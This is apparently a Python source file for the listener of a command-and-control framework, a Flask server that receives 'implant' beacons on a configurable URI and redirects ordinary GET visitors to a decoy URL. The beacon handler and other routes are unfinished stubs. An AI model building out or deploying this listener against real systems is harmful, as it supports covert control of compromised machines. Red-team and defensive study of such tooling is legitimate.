import base64
import json
import logging
import pymysql
from core.config import *
from gevent.wsgi import WSGIServer
from flask import Flask, request, redirect
from logging.handlers import RotatingFileHandler

# creates Flask app
app = Flask(__name__)
app.debug = True


class WebServer(object):

    def __init__(self, args):
        # we will reference these variables throughout the class
        self.protocol = args.protocol
        self.external_address = args.external_address
        self.port = args.port
        self.profile = args.profile

        # reads profile as a file
        with open(self.profile) as file:
            self.json_file = json.load(file)

        # tries to open the database connection
        try:
            self.connection = pymysql.connect(host="localhost",
                                              port=3306,
                                              user=username,
                                              passwd=password,
                                              db=database,
                                              autocommit=True)

        # exception raised during database connection
        except Exception:
            raise

    def is_base64(self, string):
        """
        DESCRIPTION:
            This function checks if the specified string is Base64 encoded or not

        RETURNS:
            Bool
        """
        try:
            base64.b64decode(string).decode()
            return True

        except Exception:
            return False

    def beacon_response(self):
        """
        DESCRIPTION:
            This function is called when an implant beacons

        RETURNS:
            String
        """
        # if request method is "GET"
        # the implant will never use this method
        # redirects client to the "redirect_url" specified in the profile
        if request.method == "GET":
            return redirect(self.json_file["implant"]["redirect_url"])

        # else request method is "POST"
        else:
            # TO DO: do stuff here

            return "beacon response"

    def start_web_server(self, port):
        """
        DESCRIPTION:
            This function starts the Flask web server

        RETURNS:
            None
        """
        # tries to start Flask web server
        try:
            # adds beacon route
            app.add_url_rule(self.json_file["implant"]["beacon_uri"], None, self.beacon_response, methods=["GET", "POST"])

            # TO DO: add in update route here

            # TO DO: add in "catch all" route
            # this is needed so if a client does a GET to / instead of /api/v1/playlist/getFragment
            # we will want to redirect the client to "redirect_url" in this case

            # configures Flask logging with 100 meg max file size
            # all requests are logged to "listener/logs/access.log"
            log_handler = RotatingFileHandler("logs/access.log", maxBytes=100000000, backupCount=3)
            app.logger.addHandler(log_handler)
            app.logger.setLevel(logging.INFO)

            # TO DO: add in "INSERT INTO listeners" statement here

            # starts Flask web server
            server = WSGIServer(("0.0.0.0", port), app, log=app.logger)
            server.serve_forever()

        # ignores KeyboardInterrupt exception
        except KeyboardInterrupt:
            pass

        # exception raised starting the Flask web server
        except Exception:
            raise

        # deletes all entries from "listeners" table
        # also closes the database connection
        finally:
            with self.connection.cursor() as cursor:
                cursor.execute("DELETE FROM listeners")

            if self.connection.open:
                self.connection.close()
